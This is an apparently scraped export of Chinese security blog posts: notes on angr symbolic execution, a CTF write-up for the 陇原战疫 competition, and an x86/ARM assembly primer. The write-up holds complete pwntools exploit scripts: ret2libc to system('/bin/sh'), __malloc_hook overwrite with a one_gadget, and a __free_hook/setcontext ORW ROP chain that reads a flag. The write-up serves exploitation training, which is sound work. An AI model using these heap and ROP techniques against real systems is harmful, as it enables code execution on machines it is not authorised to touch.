project.factory.entry_state(add_options=angr.options.unicorn)\nlogging.getLogger('angr').setLevel(logging.INFO)\n#现在就是停在start函数的入口\nhex(initial_state.addr)\n```\n\n\n\n## 3.中期调试\n\n### (1)中断调试\n\n```python\nimport logging\nlogging.getLogger('angr').setLevel(logging.INFO)\n#from pwn import*\n\n\ndef hook(l=None):\n    if l:\n        locals().update(l)\n    import IPython\n    IPython.embed(banner1='',confirm_exit=False)\n    exit(0)\n\n#然后在需要中断的地方调用该函数即可\nhook(locals())\n```\n\n或者使用ipdb\n\n```python\nimport ipdb\n\n#在需要断点的地方下断点即可\nipdb.set_trace()\n```\n\n使用手册\n\n```\nh(help)：帮助命令\ns(step into)：进入函数内部\nn(next)：执行下一行\nb(break): b line_number 打断点\ncl(clear): 清除断点\nc(continue): 一直执行到断点\nr(return): 从当前函数返回\nj(jump): j line_number，跳过代码片段，直接执行指定行号所在的代码\nl(list): 列出上下文代码\na(argument): 列出传入函数所有的参数值\np/pp: print 和 pretty print 打印出变量值\nr(restart): 重启调试器\nq(quit): 推出调试，清除所有信息\n```\n\n\n\n### (2)angr管理器\n\n```python\n#获取路径管理器，从入口开始运行\nsm = project.factory.simulation_manager()\nsm.run()\n\n#或者如下设置，设置初始状态和入口地址，从该状态开始探索，直到find\ninitial_state = project.factory.blank_state(addr=start_address)\nsimulation = project.factory.simgr(initial_state,veritesting=True)\nsimulation.explore(find=success_address)\n```\n\n以下为运行之后可能的状态路径\n\n![image-20211208111243588](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211208111250.png)\n\n![image-20211208111727739](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211208111727.png)\n\n然后即可通过状态来查看当前状态的中的各种内存，寄存器等\n\n![image-20211208111922248](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211208111922.png)\n\n![image-20211208111957281](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211208111957.png)\n\n\n\n### (3)获取当前块相关信息\n\n```python\n#查看block相关信息\nblock = state.block()\nblock.capstone.pp()\n```\n\n![image-20211207175452322](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211207175459.png)\n\n\n\n### (4)调试core\n\n一般而言，core可以从gdb中获得，得到当前gdb状态的所有数据，包括加载的libc函数等，我们就可以中获得相关的数据来初始化我们的state\n\n![image-20211208155507602](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211208155507.png)\n\n然后就可以对应调试了，设置还是一样的设置，只不过地址直接变成当前的gdb中的地址即可。可以看到所有内存基本一致，只有rbp,rsp等栈指针不太一样，这样比较方便我们来获取数据调试。\n\n![image-20211208155814628](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211208155815.png)\n\n \n\n### (5)继续探索\n\n当使用过的`simulation`想接着某个状态继续探索时，直接使用以下代码不会成功\n\n```python\nsimulation.explore(find = addr)\n```\n\n这时候需要获取当前`simulation`的状态`state`，然后依据该状态`state`新建一个`newSimulation`才能继续探索\n\n```python\ndef nextFind(project,state,find=0,avoid=0):\n    simulation = project.factory.simgr(state,veritesting=True)\n    simulation.explore(find = find,avoid = avoid)\n    return simulation\n```\n\n\n\n\n\n\n\n▲TIPS\n\n```python\n#输入？获取帮助\np.factory.simulation_manager?\n\n\n```\n\n\n\n1.获取字符串\n\n```python\n#转成byte类型的字符串\n#sm = p.factory.simulation_manager()\n#sm.step()\n#state = sm.active[0]\nflag = state.mem[addr].string\nflag.concrete\n\nsm.deadended[1].posix.stdout.concretize()\n```\n\n![image-20211207180744674](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211207180744.png)\n\n![image-20211208111616726](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211208111616.png)\n\n\n\n\n\n\n\n# TIPS\n\n## 1.求值问题\n\n### (1)求BVV符号值\n\n```python\na = claripy.BVV(0xffffffff, 0x4*8)\ns = claripy.Solver()\nif(s.eval(a, 0)[0] == 0xffffffff):\n    print(\"Get!\")\n```\n\n\n\n\n\n\n\n### (2)获取内存符号值\n\n```python\nstate = proj.factory.entry_state()\n#add rax, qword ptr [rsp + 8]\nstate.regs.rax += state.mem[state.regs.rsp + 8].uint64_t.resolved\n\nresult = simgr.found[0].memory.load(flag_addr, 40)\n#or get_byte\nsimulation.found[0].solver.eval(result.get_bytes(0,0x17),cast_to=bytes)\n```\n\n\n\n### (3)输入参数的值\n\n```python\n#set\ninitial_state = p.factory.entry_state(args=[binary,argv1])\nsimgr = p.factory.simgr(inital_state,veritesting=True)\nfound = simgr.found[0]\n#get\nfound.solver.eval(argv1,cast_to=bytes)\n\n\n#or such as\ndata = claripy.BVS('data',20*8)\np = angr.Project(path_to_binary, auto_load_libs=True)\ninital_state = p.factory.entry_state(stdin=data)\nsimgr = p.factory.simgr(inital_state,veritesting=True)\n#get\nprint(simgr.found[0].posix.stdin.concretize())\n```\n\n\n\n\n\n### (4)向量连接\n\n`claripy.Concat`方法用于`bitVector`的连接\n\n```python\nflag_chars = claripy.BVS('flag_%d' % 1, 8)\nflag = claripy.Concat(flag_chars + claripy.BVV(b'\\n'))\n\n#list中的向量\nflag_chars = [claripy.BVS('flag_%d' % i, 8) for i in range(28)]\nflag = claripy.Concat(*flag_chars + [claripy.BVV(b'\\n')])\n#之后在state中设置stdin=flag即可从命令行输入多组向量\n```\n\n\n\n### (5)获取内存进行对比\n\n```python\nfound.add_constraints(found.memory.load(flag_addr, 5) == int(binascii.hexlify(b\"ASIS{\"), 16))\n```\n\n\n\n### (6)常见添加flag的约束\n\n当输入某个数字，经过计算打印flag，只有简单几条路径时，就需要对flag进行约束才能正常输出，`asisctffinals2015_fake`\n\n添加约束的时候，不能使用`eval`求解，只能使用`load`\n\n#### ①整个Flag约束\n\n```python\n#这里即代表flag中应该都是[0~9]或者[a~z][-,_]，最后应该以'}'结尾\nflag = found.memory.load(flag_addr, 40)\nfor i in range(5, 5+32):\n    cond_0 = flag.get_byte(i) >= ord('0')\n    cond_1 = flag.get_byte(i) <= ord('9')\n    cond_2 = flag.get_byte(i) >= ord('a')\n    cond_3 = flag.get_byte(i) <= ord('z')\n    cond_4 = found.solver.And(cond_0, cond_1)\n    cond_5 = found.solver.And(cond_2, cond_3)\n    cond_6 = flag.get_byte(i) == ord('-')\n    cond_7 = flag.get_byte(i) == ord('_')\n    found.add_constraints(found.solver.Or(cond_4, cond_5,cond_6,cond_7))\nfound.add_constraints(flag.get_byte(32+5) == ord('}'))\n```\n\n#### ②向量约束\n\n```python\nfor b in arg1.chop(8):\n    initial_state.add_constraints(b != 0)\n```\n\n#### ③字符约束\n\n```python\n#可见\nfor i in range(36):\n    # We want those flags to be printable characters\n    state.add_constraints(flag.get_byte(i) >= 0x20)\n    state.add_constraints(flag.get_byte(i) <= 0x7e)\n    \n#Or\nfor i in range(dataLen):\n    state.solver.add(\n    \tclaripy.Or(\n            *(data.get_byte(i) == x for x in printable)\n        )\n    )\n```\n\n#### ④特殊约束\n\n```python\nfound.add_constraints(found.memory.load(flag_addr, 5) == int(binascii.hexlify(b\"ASIS{\"), 16))\nfound.add_constraints(flag.get_byte(32+5) == ord('}'))\n```\n\n\n\n\n\n### (7)方便的栈数据存取操作\n\n```python\nstate.regs.rbp = state.regs.rsp\n    state.mem[state.regs.rbp - 0x74].uint32_t = 0x40\n    state.mem[state.regs.rbp - 0x70].uint64_t = 0x1000\n    state.mem[state.regs.rbp - 0x68].uint64_t = 0x1008\n    state.mem[state.regs.rbp - 0x60].uint64_t = 0x1010\n    state.mem[state.regs.rbp - 0x58].uint64_t = 0x1018\n```\n\n\n\n### (8)获取state的输出\n\n```python\n#p = angr.Project(\"/myTest/callBinaryFunc\")\n#sm = p.factory.simulation_manager()\nprint(sm.deadended[0].posix.stdout.concretize())\n\n\n#当需要从多条路径遍历获取flag时\nout = b''\nfor pp in simulation.deadended:\n    out = pp.posix.dumps(1)\n    if b'flag{' in out:\n        final_flag = next(filter(lambda s: b'flag{' in s, out.split()))\n        print(\"[+] Success! Solution is: {0}\".format(final_flag))\n```\n\n\n\n\n\n## 2.无法识别的函数\n\nstrtol(),strlen()等一系列的字符串操作\n\n\n\n## 3.末尾加'\\x00'问题\n\n有时候会向量设置，最好在末尾加上'\\x00'，使得某些情况能够通过。同样的当有canary的时候，没办法从压入canary的地方开始的时候，这时候最好给canary向量化或者给'\\x00'截断。`sym-write`\n\n\n\n## 4.符号写问题\n\n同样的，在很多时候，最好加上`{angr.options.SYMBOLIC_WRITE_ADDRESSES}`选项，这个其实也不是很清楚，有的题不加也可以，但是有的题不加就不行。\n\n```python\nstate = project.factory.entry_state(add_options={angr.options.SYMBOLIC_WRITE_ADDRESSES})\n```\n\n\n\n## 5.32位问题\n\nx86的32位程序下，参数从栈上取，有时候通常需要设置这个才行的`flareon2015_2`\n\n```python\ns.memory.store(s.regs.esp+12, s.solver.BVV(50,8*4))\ns.mem[s.regs.esp+8].uint32_t = 0x402159\ns.mem[s.regs.esp+4].uint32_t = 0x4010e4\ns.mem[s.regs.esp].uint32_t = 0x401064\n```\n\n\n\n## 6.检查问题\n\n正常情况下某个 state 被发现是不可满足条件的，那么state会进行回溯，来确定到底是哪个state不被满足，之后所有的state会被放入到stash中。但是有的时候回溯并不好，会比较不容易出结果，尤其是运算量比较大的时候，这时候就可以添加`LAZY_SOLVES`，不进行检查，先把所有路径跑完。\n\n总的来说LAZY_SOLVES是在路径爆炸和花费在约束求解上的时间之间的平衡。\n\n同样的，有的版本是默认开启，有的是默认关闭，对应修改即可\n\n```python\nstate = p.factory.blank_state(addr=START_ADDR, add_options={angr.options.LAZY_SOLVES})\nstate = p.factory.blank_state(addr=START_ADDR, remove_options={angr.options.LAZY_SOLVES})\n```\n\n详见题目`google2016_unbreakable_1`\n\n比较适用于当find路径和avoid路径都比较容易抵达的时候，即某些库函数调用比较少，但是运算量比较庞大的时候，类似如下全是运算的\n\n![image-20211210175000853](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211210175007.png)\n\nhttps://docs.angr.io/appendix/options#option-sets\n\n[day1-r1-a-1.pdf (hitcon.org)](https://hitcon.org/2016/CMT/slide/day1-r1-a-1.pdf)\n\nhttps://flagbot.ch/lesson5.pdf\n\n\n\n## 7.执行非.text段代码\n\n正常的angr只能执行.text段的代码，但是有的题会执行非.text段的代码，不过需要在创建Project的时候加入选项`support_selfmodifying_code=True`，详见题目`tumctf2016_zwiebel`\n\n```python\nproject = angr.Project(\"zwiebel\", support_selfmodifying_code=True) \n```\n\n\n\n## 8.指定运行代码块数\n\n设定n，表示从state的状态开始运行3个基本块\n\n```python\nsimulation.run(n=3)\n```\n\n\n\n# 帮助\n\n[angr — Analysis and Coordination — angr 9.0.10689 documentation](http://angr.io/api-doc/angr.html#angr.sim_state.SimState)\n\nhttps://xz.aliyun.com/t/3990\n\nhttps://www.cnblogs.com/61355ing/p/10523147.html\n\n[angr Tutorials EP1 - Reverse Engineering 101 - YouTube](https://www.youtube.com/watch?v=9dQFM5O4KFk)\n\n\n\n[angr](https://angr.io/blog/)\n\n[关于Faster的那些事... (myts2.cn)](https://myts2.cn/2020/05/24/guan-yu-fasterde-na-xie-shi/)\n\n[[原创\\]符号执行在自动化Pwn中的简单利用-Pwn-看雪论坛-安全社区|安全招聘|bbs.pediy.com](https://bbs.pediy.com/thread-266757.htm)\n\n[shellphish/driller: Driller: augmenting AFL with symbolic execution! (github.com)](https://github.com/shellphish/driller)\n","tags":["Angr"],"categories":["Reverse","Angr"]},{"title":"陇原战疫WP","url":"/2021/11/08/陇原战疫/","content":"\n# 前言\n\n题的质量都挺不错的\n\n# 一、bbbay\n\n签到题，任意地址写8字节，改`___stack_chk_fail`函数got表为puts_plt函数，删去canary的保护，然后栈溢出泄露地址返回start重新开始，之后再栈溢出ret2Libc来getshell。\n\n```python\n# -*- coding:UTF-8 -*-\n\nfrom pwn import *\nfrom LibcSearcher import *\n\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\nbinary = \"./pwn1\"\n#libc.so = \"./libc-2.24.so\"\n#libc.so = \"\"\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s) \nuu32    = lambda data   :u32(data.ljust(4, '\\0'))\nuu64    = lambda data   :u64(data.ljust(8, '\\0'))\nu64Leakbase = lambda offset :u64(ru(\"\\x7f\")[-6: ] + '\\0\\0') - offset\nu32Leakbase = lambda offset :u32(ru(\"\\xf7\")[-4: ]) - offset\nit      = lambda                    :p.interactive()\n\n\n#libcsearcher use\n'''\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\")        #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\n'''\n\n\nlocal = 0\nif local:\n    p = process(binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n    elf = ELF(binary)\n    #libc = ELF(libc.so)\nelse:\n    p = remote(\"node4.buuoj.cn\",29806)\n    elf = ELF(binary)\n    #libc = ELF(libc.so)\n\ndef dockerDbg():\n    myGdb = remote(\"127.0.0.1\",30001)\n    myGdb.close()\n    pause()\n#b *$rebase(0xdbd)\n\ndef func1(size,con):\n    sla(\"your choice\\n\",str(1))\n    sla(\"size:\\n\",str(size))\n    sa(\"content:\\n\",con)\n\ndef func0(addr,con):\n    sla(\"your choice\\n\",str(0))\n    sla(\"address:\\n\",addr)\n    sa(\"content:\\n\",con)\n\nputs_got = 0x601018\nputs_plt = 0x4005F0\n__stack_chk_fail_got = 0x601020\npop_rdi_ret = 0x0000000000400a03\nret = pop_rdi_ret + 1\nstart_addr = 0x400670\n\npayload = \"\"\npayload += \"A\"*(0x110+0x8)\npayload += p64(pop_rdi_ret)\npayload += p64(puts_got)\npayload += p64(puts_plt)\npayload += p64(start_addr)\n\n\nfunc0(str(__stack_chk_fail_got),p64(puts_plt))\n\nfunc1(len(payload),payload)\nsl(\"2\")\nputs_addr = u64Leakbase(0)\nobj = LibcSearcher(\"puts\", puts_addr)\nlibc_base = puts_addr-obj.dump('puts')\nsystem_addr = libc_base + obj.dump(\"system\")        #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\n\npayload = \"\"\npayload += \"A\"*(0x110+0x8)\npayload += p64(pop_rdi_ret)\npayload += p64(binsh_addr)\npayload += p64(system_addr)\npayload += p64(start_addr)\nfunc1(len(payload),payload)\nsl(\"2\")\nit()\n```\n\n\n\n# 二、magic\n\n说实话这题逆向没太看懂，逆半天没逆出来个啥，还得好好学学逆向，是学长做的，不过逆向完事据说挺简单的，直接贴下学长exp吧。\n\n```python\n# coding=utf-8\n\nfrom pwn import *\nimport sys\n\nbinary = \"./Magic\"\ncontext.log_level = \"debug\"\ncontext.arch = \"amd64\"\nelf = ELF(binary)\nglobal p\n\nlocal = 0\n\nif local:\n    p = process(binary)\n    # libc = elf.libc\n    # libc = ELF(\"/glibc/x64/2.27/lib/libc-2.27.so\")\n    # p = process(binary, env={'LD_PRELOAD':'/home/mtb0tx/share/ctf-pwn/libc/libc-2.27.so'})\n    # libc = ELF(\"./libc.so.6\")\n    libc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\")\n    # libc = ELF(\"/home/mtb0tx/share/ctf-pwn/libc/libc-2.27.so\")\n    # libc = ELF(\"/lib/i386-linux-gnu/libc.so.6\")\nelse:\n    host = \"node4.buuoj.cn\"\n    port = 28077\n    p = remote(host, port)\n    # libc = ELF(\"/home/mtb0tx/share/ctf-pwn/libc/libc-2.27.so\")\n    libc = ELF(\"./libc-2.23.so\")\n\ndef dbg():\n    sleep(0.5)\n    gdb.attach(p)\n    pause()\n\ndef gdb_a(addr):\n    gdb.attach(p, \"b *{0} \\n c\".format(addr))\n    pause()\n\ndef gdb_b(addr):\n    gdb.attach(p, \"b *$rebase({0}) \\n c\".format(addr))\n    pause()\n\nse      = lambda data               :p.send(data) \nsa      = lambda delim,data         :p.sendafter(delim, data)\nsl      = lambda data               :p.sendline(data)\nsla     = lambda delim,data         :p.sendlineafter(delim, data)\nrc      = lambda num                :p.recv(num)\nrl      = lambda                    :p.recvline()\nru      = lambda delims             :p.recvuntil(delims)\nuu32    = lambda data               :u32(data.ljust(4, '\\x00'))   \nuu64    = lambda data               :u64(data.ljust(8, '\\x00'))\nl64     = lambda                    :u64(p.recvuntil(\"\\x7f\")[-6:].ljust(8,\"\\x00\"))\nl32     = lambda                    :u32(p.recvuntil(\"\\xf7\")[-4:].ljust(4,\"\\x00\"))\nli      = lambda tag, addr          :log.info(tag + \" -> \" + hex(addr))\nia      = lambda                    :p.interactive()\n\nmenu = \"Input your choice: \"\n\ndef add(a, idx, b):\n    sla(menu,'1')\n    sl(str(a))\n    sla('Input the idx',str(idx))\n    sl(str(b))\n\ndef magic(a, idx, b, magic):\n    sla(menu,'2')\n    sl(str(a))\n    sla('Input the idx',str(idx))\n    sl(str(b))\n    sla(\"Input the Magic\", magic)\n\ndef delete(a, idx, b):\n    sla(menu,'3')\n    sl(str(a))\n    sla('Input the idx',str(idx))\n    sl(str(b))\n\n\nmalloc_hook_s = libc.symbols['__malloc_hook']\nfree_hook_s = libc.symbols['__free_hook']\n\nadd(1, 0, 1)\nmagic(1, 0, 1, \"a\"*8)\nru(\"a\"*8)\nmain_arena_xx = l64()\nmalloc_hook_addr = (main_arena_xx & 0xfffffffffffff000) + (malloc_hook_s & 0xfff)\nlibc_base = malloc_hook_addr - malloc_hook_s\nfree_hook_addr = libc_base + free_hook_s\nsystem = libc_base + libc.sym['system']\nli(\"libc_base\", libc_base)\ndelete(1, 0, 1)\nmagic(1, 0, 1, p64(malloc_hook_addr - 0x23))\nadd(1, 1, 1)\nadd(0, 0, 0)\n\n'''\n0x45226 execve(\"/bin/sh\", rsp+0x30, environ)\nconstraints:\n  rax == NULL\n\n0x4527a execve(\"/bin/sh\", rsp+0x30, environ)\nconstraints:\n  [rsp+0x30] == NULL\n\n0xf03a4 execve(\"/bin/sh\", rsp+0x50, environ)\nconstraints:\n  [rsp+0x50] == NULL\n\n0xf1247 execve(\"/bin/sh\", rsp+0x70, environ)\nconstraints:\n  [rsp+0x70] == NULL\n'''\n\npl = '\\x00' * 0x13 + p64(libc_base + 0xf03a4)\nmagic(0, 0, 0, pl)\n\n# add(1, 1, 0)\n\ndelete(1, 1, 1)\ndelete(1, 1, 1)\n\n# dbg()\n\nia()\n```\n\n# 三、h3apclass\n\n这题还不错啊，有控制溢出的想法，也有沙箱保护，劫持IO。不过比赛时干其他去了，没怎么做，最后看了看觉得能做，但是时间已经不够了，这里简单复现一下。\n\n其实难度也不大，有几个点\n\n1.溢出限制\n\n就是堆溢出的时候用的是strlen()来获取size的，这样需要把堆中的内容填满，才能溢出到size位。\n\n2.edit的技巧\n\n然后后期修改的时候，由于需要改fd指针，通常用p64(addr)来修改嘛，但是这里由于strlen()的关系，只能发送6个字节，多出来的\\x00不要发送，不然输入输出容易对不上，导致程序出错。\n\n3.泄露地址的技巧\n\n劫持IO，但是2.31下需要我们泄露堆地址完成ORW劫持，所以把IO_write_base改为main_arena+96处，泄露堆地址和libc，不过这样发送的数据量会比较大，建议用sleep(2)来给程序一定的缓冲时间。\n\n4.爆破，由于没有泄露，劫持IO只能用爆破libc的方式来解决，不过也只是1/16的概率，还是很好命中的。\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\n#from LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\nbinary = \"./H3apClass\"\ncontext.binary = binary\nlibc = ELF('/lib/x86_64-linux-gnu/libc.so.6')\n#elf = ELF(binary)\ncontext.timeout = 0.2\n\nglobal p\n\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\nuu32    = lambda data   :u32(data.ljust(4, '\\0'))\nuu64    = lambda data   :u64(data.ljust(8, '\\0'))\nu64Leakbase = lambda offset :u64(ru(\"\\x7f\")[-6: ] + '\\0\\0') - offset\nu32Leakbase = lambda offset :u32(ru(\"\\xf7\")[-4: ]) - offset\nit      = lambda                    :p.interactive()\n\nmenu = \"4:Drop homework\\n\"\nmenu_n = \"4:Drop homework\"\n\ndef dockerDbg():\n\tmyGdb = remote(\"127.0.0.1\",30001)\n\tmyGdb.close()\n\tpause()\n#b *$rebase(0xdbd)\n\ndef dbg():\n\tgdb.attach(p)\n\tpause()\n    \ndef gdb_b(addr):\n    gdb.attach(p, \"b *$rebase({0}) \\n c\".format(addr))\n    sleep(0.5)\n\ndef lg(string,addr):\n    print('\\033[1;31;40m%20s-->0x%x\\033[0m'%(string,addr))\n\ndef add(idx,size,con):\n    sla(menu, \"1\")\n    sla(\"Which homework?\\n\", str(idx))\n    sla(\"size:\\n\", str(size))\n    sa(\"content:\\n\",con)\n\ndef add_n(idx,size,con):\n    sla(menu_n, \"1\")\n    sla(\"Which homework?\", str(idx))\n    sla(\"size:\", str(size))\n    sa(\"content:\",con)\n\ndef delete(idx):\n    sla(menu, \"4\")\n    sla(\"Which homework?\\n\", str(idx))\n\ndef delete_n(idx):\n    sla(menu_n, \"4\")\n    sla(\"Which homework?\", str(idx))\n\n# def show(idx):\n#     sla(menu, \"3\")\n#     sla(\"I:>>\\n\", str(idx))\n\ndef edit(idx,con):\n    sla(menu, \"3\")\n    sla(\"Which homework?\\n\", str(idx))\n    sa(\"content:\\n\",con)\n\ndef edit_n(idx,con):\n    sla(menu_n, \"3\")\n    sla(\"Which homework?\", str(idx))\n    sa(\"content:\",con)\n\ndef pwn():\n\tguess_libc=0x0000\n\tguess_IO = guess_libc + libc.sym['_IO_2_1_stdout_']\n\tguess_main = guess_libc + libc.sym['__malloc_hook'] + 0x10\n\n\tadd(0,0xf8,'A'*0xf8)\n\tadd(1,0xf8,'A'*0xf8)\n\tadd(2,0xf8,'A'*0xf8)\n\tadd(3,0xf8,'A'*0xf8)\n\tadd(4,0xf8,'A'*0xf8)\n\tadd(5,0xf8,'A'*0xf8)\n\tadd(6,0xf8,'A'*0xf8)\n\tedit(0,'A'*0xf8+p16(0x501))\n\tdelete(5)\n\tdelete(4)\n\tdelete(3)\n\tdelete(2)\n\tdelete(1)\n\tadd(1,0x78,'\\x00')\n\tadd(2,0x78,'\\x00')\n\tadd(3,0x78,p16((guess_IO)&0xffff))\n\tadd(4,0xf8,'\\x00')\n\t#dockerDbg()\n\tfd = 0x00000000fbad2887\n\tadd(5,0xf8,p64(0xfbad1800) + p64(0)*3 + p16((guess_main+96)&0xffff))\n\theap_base = uu64(rc(6)) - 0x0019a0\n\tlibc_base = u64Leakbase(0x1ebbf0)\n\n\tlg(\"libc_base\",libc_base)\n\tlg(\"heap_base\",heap_base)\n\tfree_hook = libc_base + libc.sym['__free_hook']\n\tsetcontext61 = libc_base + libc.sym['setcontext'] + 61\n\tlg(\"free_hook\",free_hook)\n\tgadget = libc_base + 0x154930\n\t#dockerDbg()\n\t#dockerDbg()\n\tdelete_n(1)\n\tdelete_n(2)\n\tdelete_n(3)\n\tedit_n(4,p32(free_hook&0xffffffff)+p16(free_hook>>32))\n\t#dockerDbg()\n\tadd_n(1,0x78,'A'*0x78)\n\tadd_n(2,0xe8,'A'*0xe8)\n\tchunk1_addr = heap_base + 0x0014b0\n\tlg(\"chunk1_addr\",chunk1_addr)\n\tadd_n(3,0x78,p64(gadget))\n\n\n\tpop_rdx_r12_ret = libc_base + 0x000000000011c371\n\tpop_rsi_ret = libc_base + 0x0000000000027529 \n\tpop_rdi_ret = libc_base + 0x0000000000026b72\n\tpop_rax_ret = libc_base + 0x000000000004a550\n\tsyscall_ret = libc_base + 0x0000000000066229\n\tret = pop_rdi_ret + 1\n\tOpen = libc_base + libc.sym['open']\n\tRead = libc_base + libc.sym['read']\n\tPuts = libc_base + libc.sym['puts']\n\n\n\tchunk_addr = chunk1_addr\n\tfake_rsp = chunk_addr + 0xb0 + 0x10\n\tflag = chunk_addr + 0xb0 \n\torw = \"a\"*0x08 + p64(chunk_addr) \n\torw += \"a\"*0x10 \n\torw += p64(libc_base + libc.sym['setcontext'] + 61) + \"a\"*0x8\n\torw += \"a\"*0x70\n\torw += p64(fake_rsp) + p64(ret)\n\torw += './flag\\x00\\x00'\n\torw += p64(0)\n\torw += p64(pop_rdi_ret) + p64(flag)\n\torw += p64(pop_rsi_ret) + p64(0)\n\torw += p64(pop_rax_ret) + p64(2)\n\torw += p64(syscall_ret)\n\torw += p64(pop_rdi_ret) + p64(3)\n\torw += p64(pop_rsi_ret) + p64(fake_rsp+0x200)\n\torw += p64(pop_rdx_r12_ret) + p64(0x30) + p64(0x0)\n\torw += p64(libc_base+libc.sym['read'])\n\torw += p64(pop_rdi_ret) + p64(1)\n\torw += p64(libc_base+libc.sym['write'])\n\tedit_n(1,orw[0:0x70])\n\tedit_n(2,orw[0x80:])\n\t#dockerDbg()\n\tdelete_n(1)\n\tit()\n\n\n\n\n\ni = 0\nwhile True:\n    i += 1\n    log.info(\"Times:%d\"%i)\n    try:\n    \t#p = remote(\"172.20.2.7\",\"26351\")\n        p = process(\"./H3apClass\")\n        pwn()\n    except EOFError:\n        p.close()\n        continue\n    except Exception:\n        p.close()\n        continue\n    else:\n        p.interactive()\n        break\n```\n\n最后的httpd没看，后面再说把。\n","tags":["比赛"],"categories":["比赛"]},{"title":"汇编基础","url":"/2021/11/02/汇编/","content":"\n\n\n# 前言\n\n复习一下汇编\n\n# 一、X86\n\n## 1.汇编指令\n\n### (1)跳转\n\n依据ZF(Zero)、SF(Symbol))、OF(Overflow)、PF(Parity)、CF(Carry)五种状态标志位有对应的跳转JZ(JNZ)/JS(JNS)等五种跳转\n\n状态标志位除了以上五种还有AF(Assistant)辅助进位\n\n此外还有Jmp无条件跳转\n\n### (2)标志位\n\n以上的六种状态标志位外，还有以下三种标志位\n\nTF(trap):跟踪标答志位：单步标志\n\nIF(interregnum):中断标志位\n\nDF(direction):方向标志位\n\n\n\n## 2.寄存器\n\n### (1)传参\n\n64位：rdi  rsi  rdx  rcx r8 r9 栈\n\n32位：栈传参\n\n### (2)栈指针\n\nRSP、RBP\n\n\n\n# 二、ARM\n\n## 1.寄存器关系\n\n![32](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211103145318.png)\n\n- R0~R3：函数调用参数，代表第0~4个参数，剩下的参数从右向左依次入栈，函数返回值保存在R0中。(对应在aarch64中为R0~R7，但是gdb调试或者IDA中一般显示X0~X30，同时还有低32位的W0~W30)\n\n- SP：类似rsp,esp，栈指针\n\n- FP：类似ebp，栈指针\n- LR：当发生函数调用时，会保存调用函数处的地址，退出函数时赋值给PC。\n\n- PC：类似eip,rip，存储下一条指令的地址。\n\n- R11：类似ebp，栈指针，其实就差不多是FP\n\n## 2.汇编指令\n\n### (1)寄存器传送MOV\n\n寄存器之间还是MOV指令，比如MOV R2,R0;但是如果涉及到内存上的，则需要先加载到寄存器中，或者把寄存器中的值存储到内存中\n\n### (2)寄存器-内存传送\n\nSTR(store reg)/LDR(load reg)以及STM(store multiple)/LDM(load multiple)\n\n#### ①STR/LDR模式\n\n##### STR Ra [Rb]：\n\nRa中的数据存储到Rb指向的内存中\n\n##### LDR Ra [Rb]\n\nRb指向的内存中的值加载到Ra中\n\n此外还有如下情形\n\n```\nSTR  R0,[R1, #12]  // R0 --> [R1+12]\nLDR  R4,[R5, R6]  // R4 <-- [R5+R6]\n```\n\n\n\n#### ②STM/LDM模式\n\n##### STM R0, {R4,R5}\n\nR4的值传送给R0+x对应的内存单元，然后R5的值传给R0+x+x对应的内存单元\n\n这个x即由后缀决定，分别有以下几种\n\n- DB(Decrease Before)：每次传送前R0加上x，x为负数\n\n- DA(Decrease After)：每次传送后R0加上x，x为负数\n\n- IB(Increase Before)：每次传送前R0加上x，x为正数\n- IA(Increase After)：每次传送后R0加上x，x为正数\n\n而X则在不同的CPU位数下不同，32为4，64则为8。\n\n此外堆栈的增长方向可以不同，也可以在不同情形下作为后缀，效果一样的\n\n- FD(Full Descent)：满递减堆栈\n- FA(Full Ascent)：满递增堆栈\n- ED(Empty Descent)：空递减堆栈\n- EA(Empty Ascent)：空递增堆栈\n\n满则代表栈指针指向栈顶，空则代表栈指针不指向栈顶\n\n\n\n### (3)跳转指令\n\n#### ①分支跳转(Branch)\n\n##### B\n\n无条件跳转\n\n##### BX \\<Rm\\>\n\n由寄存器给出地址\n\n若 Rm 的 bit[0] 为1，切换到 Thumb 指令执行；\n\n若 Rm 的 bit[0] 为0，切换到 ARM 指令执行。\n\n##### BL\n\n类似于Call，会存入返回地址到LR寄存器\n\n##### BLX/BLR\n\n即类似对应组合\n\n#### ②条件跳转\n\n依据CPSR寄存器下的ALU状态标志位\n\nCPSR寄存器包含下面的ALU状态标志：\n\n　　N　 Set when the result of the operation was Negative(结果为负数)\n\n　　Z\tSet when the result of the operation was 